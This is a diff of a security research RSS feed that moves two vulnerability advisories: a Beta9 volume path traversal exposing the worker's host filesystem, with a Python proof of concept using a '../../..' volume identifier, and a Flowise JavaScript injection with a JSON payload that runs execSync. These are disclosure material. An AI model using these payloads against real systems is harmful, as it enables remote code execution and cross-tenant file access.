@@ -4,7 +4,7 @@
         <title>JFrog Security Vulnerabilities</title>
         <link>https://research.jfrog.com/</link>
         <description>Latest vulnerability disclosures discovered by JFrog Security Research.</description>
-        <lastBuildDate>Fri, 06 Nov 2026 00:25:05 GMT</lastBuildDate>
+        <lastBuildDate>Sat, 07 Nov 2026 00:21:56 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Gridsome Feed Plugin</generator>
         <language>en</language>
@@ -216,6 +216,141 @@ https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
+            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
+
+
+## Component
+
+Beta9 gateway and worker (github.com/beam-cloud/beta9)
+
+## Affected versions
+
+gateway < 0.1.776
+worker < 0.1.756
+
+## Description
+
+A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
+
+A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
+
+Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
+
+## PoC
+
+<br>
+
+**Step 1 - Install the client and select the deployment**
+
+<br>
+
+```
+pip install beta9
+beta9 configure --token <ANY_WORKSPACE_TOKEN>
+```
+
+<br>
+
+**Step 2 - Save the volume deploy**
+
+<br>
+
+The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
+
+```
+import os
+
+from beta9 import Image, function
+from beta9.abstractions.volume import Volume
+
+
+class TraversalVolume(Volume):
+    def __init__(self, volume_id: str, mount_path: str):
+        super().__init__(name="poc", mount_path=mount_path)
+        self.volume_id = volume_id
+        self.ready = True
+
+
+HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
+
+
+@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
+def read_worker_host():
+    proof = {}
+    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
+        try:
+            with open(f) as fh:
+                proof[f] = fh.read()[:200]
+        except Exception as e:
+            proof[f] = f"<unreadable: {e}>"
+    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
+    return proof
+
+
+if __name__ == "__main__":
+    result = read_worker_host.remote()
+    print("\n===== PoC result (executed inside the sandboxed container) =====")
+    for k, v in result.items():
+        print(f"\n--- {k} ---\n{v}")
+```
+
+<br>
+
+**Step 3 - Deploy and run it**
+
+<br>
+
+```
+python3 poc_volume_traversal.py
+```
+
+<br>
+
+Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
+
+```
+===== PoC result (executed inside the sandboxed container) =====
+
+--- /pwn/etc/hostname ---
+<worker hostname>
+
+--- /pwn/etc/resolv.conf ---
+<worker resolver configuration>
+
+--- /pwn (host /) ---
+['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
+```
+
+<br>
+
+On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
+
+## Vulnerability Mitigations
+
+Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
+
+The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
+
+## References
+https://www.cve.org/CVERecord?id=CVE-2026-120308
+https://github.com/beam-cloud/beta9/pull/1897
+https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
+https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
+https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
+https://github.com/beam-cloud/beta9
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Beta9 is vulnerable to a Container Escape via Unvalidated Sandbox File Paths]]></title>
             <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</link>
             <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-a-container-escape-via-unvalidated-sandbox-file-paths-cve-2026-120307/</guid>
@@ -419,141 +554,6 @@ https://www.cve.org/CVERecord?id=CVE-2026-120307
 https://github.com/beam-cloud/beta9/pull/1897
 https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
 https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/beta9-is-vulnerable-to-host-filesystem-exposure-via-volume-path-traversal-cve-2026-120308/</guid>
-            <pubDate>Sun, 01 Nov 2026 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2026-120308, CRITICAL, Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Beta9 is vulnerable to Host Filesystem Exposure via Volume Path Traversal
-
-
-## Component
-
-Beta9 gateway and worker (github.com/beam-cloud/beta9)
-
-## Affected versions
-
-gateway < 0.1.776
-worker < 0.1.756
-
-## Description
-
-A tenant who deploys a function, endpoint, or task queue on Beta9 can attach a volume. `ConfigureContainerRequestMounts` in `pkg/abstractions/common/mount.go` builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root. The worker bind-mounts that path into the sandbox. The mount is read-write unless the volume was explicitly marked read-only, which is not the default.
-
-A workspace token is enough. On gateway 0.1.769 and worker 0.1.745, a volume identifier made of parent-directory segments made the container mount show the worker root: the worker hostname and resolver configuration were readable from inside the sandbox, and the directory listing contained host directories rather than an empty tenant volume. Other tenants' volumes stored on that host are on the same filesystem. The proof read those files. It was not run against a live multi-tenant cluster.
-
-Gateway 0.1.776 and worker 0.1.756 reject an identifier that is empty, `.`, `..`, or contains a slash, and a mount path that contains a `..` segment. The gateway also refuses a volume the workspace does not own. Stubs saved before the check existed are validated when they are launched, so both components need the upgrade.
-
-## PoC
-
-<br>
-
-**Step 1 - Install the client and select the deployment**
-
-<br>
-
-```
-pip install beta9
-beta9 configure --token <ANY_WORKSPACE_TOKEN>
-```
-
-<br>
-
-**Step 2 - Save the volume deploy**
-
-<br>
-
-The subclass marks the volume ready so the client sends the identifier as given, instead of looking up a real volume first. The function then reads two files through the resulting mount and lists the mount root.
-
-```
-import os
-
-from beta9 import Image, function
-from beta9.abstractions.volume import Volume
-
-
-class TraversalVolume(Volume):
-    def __init__(self, volume_id: str, mount_path: str):
-        super().__init__(name="poc", mount_path=mount_path)
-        self.volume_id = volume_id
-        self.ready = True
-
-
-HOST_ROOT = TraversalVolume(volume_id="../../..", mount_path="/pwn")
-
-
-@function(volumes=[HOST_ROOT], image=Image(), cpu=0.5, memory=256)
-def read_worker_host():
-    proof = {}
-    for f in ("/pwn/etc/hostname", "/pwn/etc/resolv.conf"):
-        try:
-            with open(f) as fh:
-                proof[f] = fh.read()[:200]
-        except Exception as e:
-            proof[f] = f"<unreadable: {e}>"
-    proof["/pwn (host /)"] = sorted(os.listdir("/pwn"))
-    return proof
-
-
-if __name__ == "__main__":
-    result = read_worker_host.remote()
-    print("\n===== PoC result (executed inside the sandboxed container) =====")
-    for k, v in result.items():
-        print(f"\n--- {k} ---\n{v}")
-```
-
-<br>
-
-**Step 3 - Deploy and run it**
-
-<br>
-
-```
-python3 poc_volume_traversal.py
-```
-
-<br>
-
-Expected output on gateway 0.1.769 with worker 0.1.745. `/pwn` is the worker root, so the listing contains host directories such as `/data`, `/root`, and `/run`, and the hostname file is the worker's:
-
-```
-===== PoC result (executed inside the sandboxed container) =====
-
---- /pwn/etc/hostname ---
-<worker hostname>
-
---- /pwn/etc/resolv.conf ---
-<worker resolver configuration>
-
---- /pwn (host /) ---
-['bin', 'data', 'etc', 'lib', 'root', 'run', ...]
-```
-
-<br>
-
-On gateway 0.1.776 or later, together with worker 0.1.756 or later, stub creation rejects the identifier and the function does not start.
-
-## Vulnerability Mitigations
-
-Upgrade the gateway to 0.1.776 or later and the worker to 0.1.756 or later. Volume identifiers and mount paths are validated before a mount is built, and the gateway rejects a volume that does not exist or is not owned by the workspace. Upgrade both. A stub saved by an old gateway is checked again when a new worker launches it, and an old worker still mounts the path an old gateway sends.
-
-The change is https://github.com/beam-cloud/beta9/pull/1897, commit a28bf12cf0007c792a25d8ed282b4e8bf6f30393, released on 2026-09-15.
-
-## References
-https://www.cve.org/CVERecord?id=CVE-2026-120308
-https://github.com/beam-cloud/beta9/pull/1897
-https://github.com/beam-cloud/beta9/commit/a28bf12cf0007c792a25d8ed282b4e8bf6f30393
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.776
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.756
-https://github.com/beam-cloud/beta9/releases/tag/gateway-0.1.769
-https://github.com/beam-cloud/beta9/releases/tag/worker-0.1.745
 https://github.com/beam-cloud/beta9
 ]]></content:encoded>
         </item>
@@ -3391,6 +3391,60 @@ additional_authorized_imports=[],executor_type='wasm')
 ]]></content:encoded>
         </item>
         <item>
+            <title><![CDATA[Flowise JS injection remote code execution]]></title>
+            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
+            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
+            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
+            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
+            <content:encoded><![CDATA[
+## Summary
+
+Unintended dynamic code execution leads to remote code execution by network attackers
+
+## Component
+
+[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
+
+## Affected versions
+
+(,)
+
+## Description
+
+User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
+
+
+## PoC
+
+Send the following payload to the `node-load-method/customMCP` API endpoint -
+
+```json
+{
+    "inputs":
+    {
+        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
+    },
+    "loadMethod": "listActions"
+}
+```
+
+
+
+
+
+## Vulnerability Mitigations
+
+No mitigations are supplied for this issue
+
+
+
+## References
+
+
+
+]]></content:encoded>
+        </item>
+        <item>
             <title><![CDATA[Flowise OS command remote code execution]]></title>
             <link>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</link>
             <guid>https://research.jfrog.com/vulnerabilities/flowise-os-command-remote-code-execution-jfsa-2025-001380578/</guid>
@@ -3439,60 +3493,6 @@ Send the following payload to the `node-load-method/customMCP` API endpoint -
 ## Vulnerability Mitigations
 
 No mitigations are supplied for this issue
-
-## References
-
-
-
-]]></content:encoded>
-        </item>
-        <item>
-            <title><![CDATA[Flowise JS injection remote code execution]]></title>
-            <link>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</link>
-            <guid>https://research.jfrog.com/vulnerabilities/flowise-js-injection-remote-code-exection-jfsa-2025-001379925/</guid>
-            <pubDate>Thu, 14 Aug 2025 00:00:00 GMT</pubDate>
-            <description><![CDATA[CVE-2025-55346, CRITICAL, Flowise JS injection remote code execution]]></description>
-            <content:encoded><![CDATA[
-## Summary
-
-Unintended dynamic code execution leads to remote code execution by network attackers
-
-## Component
-
-[flowise](https://www.npmjs.com/package/flowise?activeTab=code)
-
-## Affected versions
-
-(,)
-
-## Description
-
-User-controlled input flows to an unsafe implementation of a dynamic Function constructor, allowing network attackers to run arbitrary unsandboxed JS code in the context of the host, by sending a simple POST request. Depending on the version of Flowise this could lead to either unauthenticated or authenticated remote code execution.
-
-
-## PoC
-
-Send the following payload to the `node-load-method/customMCP` API endpoint -
-
-```json
-{
-    "inputs":
-    {
-        "mcpServerConfig": "(global.process.mainModule.require('child_process').execSync('touch /tmp/foo'))"
-    },
-    "loadMethod": "listActions"
-}
-```
-
-
-
-
-
-## Vulnerability Mitigations
-
-No mitigations are supplied for this issue
-
-
 
 ## References
 
